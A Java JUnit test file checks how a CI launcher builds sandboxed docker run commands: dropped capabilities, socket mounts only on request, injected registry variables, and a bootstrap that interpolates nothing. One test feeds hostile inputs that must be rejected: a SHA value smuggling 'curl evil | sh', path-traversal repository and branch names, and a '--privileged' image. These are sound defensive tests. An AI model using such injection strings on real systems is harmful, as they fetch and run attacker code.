package eu.wohlben.qits.ci.daemonhost;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.ci.daemonhost.CiDaemonLauncher.LaunchSpec;
import eu.wohlben.qits.ci.error.BadRequestException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.LogRecord;
import org.junit.jupiter.api.Test;

/**
 * Argv and bootstrap assembly only — the real {@code docker run} is covered by the extended {@code
 * CiDaemonHandshakeIT}. Worth its own test because the argv <b>is</b> the sandbox: a flag lost in a
 * refactor is invisible everywhere else until it is invisible in production.
 *
 * <p><b>Deliberately does not exercise {@link CiDaemonLauncher#daemonVersion()}.</b> That method
 * delegates to the injected {@code CiDaemonPins} ladder (ci-daemon-autoadopt-plan.md, workstream
 * BV), a real CDI bean this plain-construction test never wires up; its coverage lives in
 * {@code CiDaemonPinsTest} and {@code CiDaemonPinTest} instead. This class stays about pure argv
 * assembly, which is why it can be {@code new CiDaemonLauncher()} with fields set by hand rather
 * than a {@code @QuarkusTest}.
 */
public class CiDaemonLauncherTest {

  private CiDaemonLauncher launcher() {
    return launcher("http://qits-githost:8080/");
  }

  private CiDaemonLauncher launcher(String containerGitUrl) {
    CiDaemonLauncher launcher = new CiDaemonLauncher();
    launcher.runtime = "docker";
    launcher.network = "qits-net";
    launcher.containerGitUrl = containerGitUrl;
    launcher.containerDaemonUrl = "ws://qits-ci:8080/ci/daemon";
    launcher.daemonBinaryUrlTemplate = "http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/{version}";
    launcher.registerTimeoutSeconds = 60;
    launcher.outputMaxChars = 65536;
    launcher.memoryLimit = "4g";
    launcher.pidsLimit = "2048";
    launcher.cpus = "2";
    launcher.dockerSocketPath = "/var/run/docker.sock";
    launcher.artifactsRegistryHost = "qits-artifacts:8080";
    launcher.artifactsImageRepository = "qits";
    launcher.artifactsNpmHostedUrl = "http://qits-artifacts:8080/artifacts/npm/npm/";
    launcher.artifactsNpmProxyUrl = "http://qits-artifacts:8080/artifacts/npm/npmjs/";
    launcher.artifactsMavenRegistryUrl = "http://qits-artifacts:8080/artifacts/maven/maven";
    launcher.artifactsDocsUrl = "http://qits-artifacts:8080/artifacts/docs/docs";
    launcher.workspacesUrl = "http://qits-workspaces:8080";
    return launcher;
  }

  private final LaunchSpec spec =
      new LaunchSpec(
          "0123456789abcdef-run",
          2,
          "repo-1",
          "main",
          "cafebabe",
          "maven:3.9",
          "daemon-7",
          "s3cr3t",
          "http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/deadbeef",
          false,
          Map.of());

  /** The same step, having declared {@code docker: true} — the only difference anywhere. */
  private LaunchSpec publishing() {
    return new LaunchSpec(
        spec.runId(),
        spec.stepIndex(),
        spec.repoId(),
        spec.branch(),
        spec.sha(),
        spec.image(),
        spec.daemonId(),
        spec.secret(),
        spec.daemonBinaryUrl(),
        true,
        spec.env());
  }

  @Test
  public void buildsTheDetachedDockerRunArgv() {
    assertEquals(
        List.of(
            "docker",
            "run",
            "-d",
            "--name",
            "qits-ci-01234567-412621e6-2",
            "--network",
            "qits-net",
            "--add-host=host.docker.internal:host-gateway",
            "--label",
            "qits.ci.run=0123456789abcdef-run",
            "--security-opt=no-new-privileges",
            "--cap-drop=ALL",
            "--memory",
            "4g",
            "--memory-swap",
            "4g",
            "--pids-limit",
            "2048",
            "--cpus",
            "2",
            "--env",
            "QITS_CI_DAEMON_ID=daemon-7",
            "--env",
            "QITS_CI_DAEMON_SECRET=s3cr3t",
            "--env",
            "QITS_CI_DAEMON_URL=ws://qits-ci:8080/ci/daemon",
            "--env",
            "QITS_CI_DAEMON_BINARY_URL=http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/deadbeef",
            "--env",
            "QITS_CI_REPOSITORY_URL=http://qits-githost:8080/git/repo-1",
            "--env",
            "QITS_CI_BRANCH=main",
            "--env",
            "QITS_CI_SHA=cafebabe",
            "--env",
            "QITS_CI_REPO_ID=repo-1",
            "--env",
            "CI=true",
            "--env",
            "QITS_CI=true",
            "--env",
            "QITS_REGISTRY=qits-artifacts:8080",
            "--env",
            "QITS_IMAGE_REPOSITORY=qits",
            "--env",
            "QITS_NPM_REGISTRY_URL=http://qits-artifacts:8080/artifacts/npm/npm/",
            "--env",
            "QITS_NPM_PROXY_URL=http://qits-artifacts:8080/artifacts/npm/npmjs/",
            "--env",
            "QITS_MAVEN_REGISTRY_URL=http://qits-artifacts:8080/artifacts/maven/maven",
            "--env",
            "QITS_DOCS_URL=http://qits-artifacts:8080/artifacts/docs/docs",
            "--env",
            "QITS_WORKSPACES_URL=http://qits-workspaces:8080",
            "--entrypoint",
            "/bin/sh",
            "maven:3.9",
            "-c",
            CiDaemonLauncher.BOOTSTRAP),
        launcher().buildArgv(spec));
  }

  @Test
  public void aStepThatDeclaredDockerGetsTheHostSocketAndOnlyThat() {
    List<String> plain = launcher().buildArgv(spec);
    List<String> withDocker = launcher().buildArgv(publishing());

    // The mount is there, at the same path on both sides so the step image's CLI finds it by default.
    int mount = withDocker.indexOf("-v");
    assertTrue(mount >= 0, withDocker.toString());
    assertEquals("/var/run/docker.sock:/var/run/docker.sock", withDocker.get(mount + 1));

    // And it is the ONLY difference: the sandbox does not relax for a publish step, because cap-drop
    // and no-new-privileges cost a socket client nothing and keeping them unconditional is what keeps
    // them meaning something for the steps that never opt in.
    List<String> withoutTheMount = new java.util.ArrayList<>(withDocker);
    withoutTheMount.subList(mount, mount + 2).clear();
    assertEquals(plain, withoutTheMount, "declaring docker must add a mount and change nothing else");
    assertTrue(withDocker.contains("--cap-drop=ALL"), withDocker.toString());
    assertTrue(withDocker.contains("--security-opt=no-new-privileges"), withDocker.toString());
  }

  @Test
  public void aStepThatDeclaredNothingGetsNoDockerSocketAtAll() {
    // THIS is the security assertion of the pair — the absence, not the presence. A step's script is
    // repo-controlled code and the docker socket is root on the host, so "no socket unless the config
    // said so" is the invariant, and an accidental unconditional mount would be invisible everywhere
    // else in this repository until it was invisible in production.
    List<String> argv = launcher().buildArgv(spec);
    assertFalse(argv.contains("-v"), argv.toString());
    assertFalse(argv.contains("--volume"), argv.toString());
    for (String arg : argv) {
      assertFalse(arg.contains("docker.sock"), "no step may see a docker socket it did not ask for: " + arg);
    }
  }

  @Test
  public void everyStepIsToldWhereAPublishedImageGoes() {
    // Injected unconditionally, opted in or not: "which registry" must never be a literal in a
    // repository's pipeline. With $QITS_CI_SHA these two are the whole tag convention qits-cd pulls
    // by, and they are named after their owner because qits-cd ships the same pair.
    for (LaunchSpec each : List.of(spec, publishing())) {
      List<String> argv = launcher().buildArgv(each);
      assertTrue(argv.contains("QITS_REGISTRY=qits-artifacts:8080"), argv.toString());
      assertTrue(argv.contains("QITS_IMAGE_REPOSITORY=qits"), argv.toString());
      assertTrue(argv.contains("QITS_CI_SHA=cafebabe"), argv.toString());
    }
  }

  @Test
  public void everyStepIsToldWhereNpmPackagesComeFromAndGoTo() {
    // Also unconditional, and for the same reason — but note what changes about the reasoning: these
    // two are dialled by the step container itself over the shared network, so a publish to them is
    // an ordinary HTTP step that never declares `docker: true`, and the in-network alias is the
    // value that is CORRECT here rather than the one a host-published mapping replaces.
    for (LaunchSpec each : List.of(spec, publishing())) {
      List<String> argv = launcher().buildArgv(each);
      assertTrue(
          argv.contains("QITS_NPM_REGISTRY_URL=http://qits-artifacts:8080/artifacts/npm/npm/"),
          argv.toString());
      assertTrue(
          argv.contains("QITS_NPM_PROXY_URL=http://qits-artifacts:8080/artifacts/npm/npmjs/"),
          argv.toString());
    }
  }

  @Test
  public void everyStepIsToldWhereMavenPackagesComeFromAndGoTo() {
    for (LaunchSpec each : List.of(spec, publishing())) {
      List<String> argv = launcher().buildArgv(each);
      assertTrue(
          argv.contains(
              "QITS_MAVEN_REGISTRY_URL=http://qits-artifacts:8080/artifacts/maven/maven"),
          argv.toString());
    }
  }

  @Test
  public void everyStepIsToldWhereItsDocumentationGoes() {
    // Including the `docs` namespace segment: there is one docs repository and a pipeline that got
    // to name one could publish into a namespace nothing serves.
    for (LaunchSpec each : List.of(spec, publishing())) {
      List<String> argv = launcher().buildArgv(each);
      assertTrue(
          argv.contains("QITS_DOCS_URL=http://qits-artifacts:8080/artifacts/docs/docs"),
          argv.toString());
    }
  }

  @Test
  public void everyStepIsToldWhereToAskForItsOwnRepositoryToBeReleased() {
    // The release train's maintenance step POSTs to qits-workspaces after the tests it follows went
    // green. Unconditional and container-dialled for the same reasons as the npm pair: the file
    // states no deployment fact, and the in-network alias is what a step container can reach.
    for (LaunchSpec each : List.of(spec, publishing())) {
      assertTrue(
          launcher().buildArgv(each).contains("QITS_WORKSPACES_URL=http://qits-workspaces:8080"),
          launcher().buildArgv(each).toString());
    }
  }

  @Test
  public void theContainerIsDetachedAndNotSelfRemoving() {
    List<String> argv = launcher().buildArgv(spec);
    assertTrue(argv.contains("-d"), argv.toString());
    // --rm would race the `docker logs` capture that is the only diagnosis a container which never
    // registered can offer; every teardown is an explicit `docker rm -f` instead.
    assertFalse(argv.contains("--rm"), argv.toString());
  }

  @Test
  public void theBootstrapInterpolatesNothingAtAll() {
    String bootstrap = CiDaemonLauncher.BOOTSTRAP;
    // Every value the container needs is a shell variable it reads from its own environment. If any
    // of these appeared in the text, a repository would have found a way into a command line.
    for (String value :
        List.of("repo-1", "cafebabe", "main", "daemon-7", "s3cr3t", "maven:3.9", "qits-artifacts")) {
      assertFalse(bootstrap.contains(value), "bootstrap must not carry '" + value + "'");
    }
    assertEquals(bootstrap, launcher().buildArgv(spec).getLast());
    // ...and the invariant the whole feature rests on: no repo-controlled code in a host argv.
    assertFalse(bootstrap.contains("bash -c"), bootstrap);
    assertFalse(bootstrap.contains("docker"), bootstrap);
  }

  @Test
  public void theBootstrapProbesBothDownloadersAndSaysSoWhenItHasNeither() {
    String bootstrap = CiDaemonLauncher.BOOTSTRAP;
    assertTrue(bootstrap.contains("command -v wget"), bootstrap);
    assertTrue(bootstrap.contains("command -v curl"), bootstrap);
    // The image contract, stated in the container's own log — which is what the never-registered
    // reap captures, so an image missing a downloader diagnoses itself.
    assertTrue(bootstrap.contains("neither wget nor curl"), bootstrap);
    assertTrue(bootstrap.contains("chmod +x /tmp/qits-ci-daemon"), bootstrap);
    // exec, so the daemon is PID 1 and a `docker rm -f` signals it rather than a wrapping shell.
    assertTrue(bootstrap.contains("exec /tmp/qits-ci-daemon"), bootstrap);
  }

  @Test
  public void theBinaryUrlIsTheVersionResolvedIntoTheTemplate() {
    // One template rather than two free values, so the version pin and the download address cannot
    // drift apart. {version} is a version-addressed pin, not a digest, since the template flip
    // (ci-daemon-autoadopt-plan.md); resolveBinaryUrl itself does not care which spelling it is
    // handed.
    assertEquals(
        "http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/abc123",
        launcher().resolveBinaryUrl("abc123"));
  }

  /**
   * The configured base names the SERVICE and ci appends {@code /git/<repoId>} — which is what makes
   * qits-githost's move a config change rather than a code change. The host used to answer under
   * qits-artifacts' {@code /artifacts} segment and answers at the root now; both are just bases to
   * this method, and the fixture's trailing slash is stripped either way.
   */
  @Test
  public void theCloneUrlEndsAtTheServiceAndCiAppendsTheGitSegment() {
    assertEquals("http://qits-githost:8080/git/repo-1", launcher().cloneUrl("repo-1"));
    assertEquals(
        "http://a-host-of-any-depth/below/git/repo-1",
        launcher("http://a-host-of-any-depth/below").cloneUrl("repo-1"));
  }

  @Test
  public void hostileIdentifiersAreRejectedBeforeAnyDockerCall() {
    CiDaemonLauncher launcher = launcher();
    LaunchSpec injectedSha =
        new LaunchSpec("run", 0, "repo-1", "main", "x\"; curl evil | sh #", "img", "d", "s", "u", false, Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(injectedSha));
    LaunchSpec traversal =
        new LaunchSpec("run", 0, "../../etc", "main", "cafebabe", "img", "d", "s", "u", false, Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(traversal));
    LaunchSpec injectedBranch =
        new LaunchSpec("run", 0, "repo-1", "main/../..", "cafebabe", "img", "d", "s", "u", false, Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(injectedBranch));
    // The image is repo-declared rather than intake-supplied, and it is a positional argument to the
    // docker CLI. Nothing is known to get through it — ProcessBuilder does not shell-split and the
    // trailing `-c <BOOTSTRAP>` defeats the obvious re-parses — but an argument that can be read as
    // an option is not a thing to leave to the parser's good manners.
    LaunchSpec optionShapedImage =
        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "--privileged", "d", "s", "u", false, Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(optionShapedImage));
    LaunchSpec blankImage =
        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "  ", "d", "s", "u", false, Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(blankImage));
  }

  @Test
  public void shortRunIdsStillNameAValidStableContainer() {
    // "Used whole" no longer literally holds -- a disambiguator now rides alongside even a runId
    // short enough to need no truncation, because containerName must not assume any runId shape.
    // What still holds: the hint stays readable, and the same input always names the same container.
    String name = CiDaemonLauncher.containerName("abc", 0);
    assertEquals("qits-ci-abc-17862-0", name);
    assertEquals(name, CiDaemonLauncher.containerName("abc", 0), "must be deterministic");
    assertTrue(name.matches("[a-zA-Z0-9][a-zA-Z0-9_.-]*"), "must stay inside docker's name charset");
  }

  @Test
  public void twoRunIdsSharingAnEightCharacterPrefixNeverCollide() {
    // The literal shape of today's incident: every probe runId used to be "daemon-probe-" + a UUID,
    // so the blind 8-character substring was always "daemon-p" and two concurrent probes always
    // named the same container. Both runIds below still share that same 8-character prefix; the
    // disambiguator -- derived from the WHOLE runId -- is what keeps their container names apart now.
    String a = CiDaemonLauncher.containerName("daemon-probe-11111111-1111-1111-1111-111111111111", 0);
    String b = CiDaemonLauncher.containerName("daemon-probe-22222222-2222-2222-2222-222222222222", 0);
    assertTrue(a.startsWith("qits-ci-daemon-p-"), a);
    assertTrue(b.startsWith("qits-ci-daemon-p-"), b);
    assertFalse(a.equals(b), "runIds sharing an 8-char prefix must still name different containers");
  }

  @Test
  public void twoFreshProbeRunIdsNeverCollide() {
    // The concrete case this incident hit, with CiDaemonContainerProbe's own (now bare-UUID) runId
    // generation: two distinct random UUIDs must not collide on the resulting container name. Not a
    // guarantee about UUID collisions in general -- just that containerName does not throw the
    // entropy away the way the old blind prefix did.
    String runIdA = java.util.UUID.randomUUID().toString();
    String runIdB = java.util.UUID.randomUUID().toString();
    assertFalse(runIdA.equals(runIdB), "test setup: the two random UUIDs must differ");
    assertFalse(
        CiDaemonLauncher.containerName(runIdA, 0).equals(CiDaemonLauncher.containerName(runIdB, 0)),
        "two distinct probe runIds must not collide on the container name");
  }

  /**
   * <b>A docker the boot sweep cannot reach must say so.</b> The success path logs only a positive
   * count, so while the failure was a DEBUG the two outcomes an operator most needs to tell apart —
   * "there was nothing to sweep" and "the sweep never ran, so the orphans are still there" — left
   * exactly the same (empty) log. Both cases are asserted here together, because the claim is about
   * the difference between them and not about either line on its own.
   *
   * <p>The fake docker is a two-line shell script on {@code runtime}: this class already wires that
   * field by hand, so nothing has to be stubbed inside {@code CiProcess} to make the CLI fail — the
   * real process really runs and really exits non-zero.
   */
  @Test
  public void aDockerThatCannotBeReachedWarnsInsteadOfLookingLikeAnEmptyHost() throws Exception {
    String complaint = "Cannot connect to the Docker daemon at unix:///var/run/docker.sock.";
    CiDaemonLauncher launcher = launcher();
    launcher.runtime = fakeDocker("echo '" + complaint + "' >&2\nexit 3\n").toString();

    List<String> warnings = new ArrayList<>();
    Handler capture = captureWarnings(warnings);
    java.util.logging.Logger launcherLog =
        java.util.logging.Logger.getLogger(CiDaemonLauncher.class.getName());
    launcherLog.addHandler(capture);
    try {
      assertEquals(0, launcher.reapOrphans(), "a boot must not fail because docker is down");
      assertEquals(1, warnings.size(), "one WARN, naming the failure: " + warnings);
      String warning = warnings.getFirst();
      assertTrue(warning.contains("exited 3"), "the exit code belongs in it: " + warning);
      assertTrue(warning.contains(complaint), "so does docker's own words: " + warning);

      // And the other half of the claim: a docker that answers with an empty list is silent, so the
      // WARN above means "could not sweep" rather than "swept nothing".
      warnings.clear();
      launcher.runtime = fakeDocker("exit 0\n").toString();
      assertEquals(0, launcher.reapOrphans());
      assertEquals(List.of(), warnings, "an empty host is not a problem and must not warn");
    } finally {
      launcherLog.removeHandler(capture);
    }
  }

  /** An executable standing in for the docker CLI, running the given script body. */
  private static Path fakeDocker(String body) throws Exception {
    Path script = Files.createTempFile("qits-fake-docker", ".sh");
    Files.writeString(script, "#!/bin/sh\n" + body);
    script.toFile().setExecutable(true);
    script.toFile().deleteOnExit();
    return script;
  }

  private static Handler captureWarnings(List<String> into) {
    return new Handler() {
      @Override
      public void publish(LogRecord record) {
        if (record.getLevel().intValue() >= Level.WARNING.intValue()) {
          into.add(rendered(record));
        }
      }

      @Override
      public void flush() {}

      @Override
      public void close() {}
    };
  }

  /**
   * {@code LOG.warnf} hands the log manager a printf format plus its arguments and leaves the
   * rendering to the handler, so the assertions above have to do that rendering themselves. A
   * provider that formats eagerly leaves no parameters, and then the message is already the answer.
   */
  private static String rendered(LogRecord record) {
    Object[] parameters = record.getParameters();
    if (parameters == null || parameters.length == 0) {
      return record.getMessage();
    }
    try {
      return String.format(record.getMessage(), parameters);
    } catch (RuntimeException e) {
      return record.getMessage() + " " + Arrays.toString(parameters);
    }
  }

  // The boot-time shape check that used to live here (daemonVersionComplaint) is gone with the
  // template flip: it warned only while the shipped template still addressed the binary by digest,
  // and it would have gone silent by construction the moment that stopped being true
  // (ci-daemon-autoadopt-plan.md §1.5). Its replacement, CiIdentifiers.requireDaemonVersion, is
  // enforced where a version now actually arrives untrusted — at adoption, in CiDaemonPinsTest —
  // rather than warned about at boot.
}
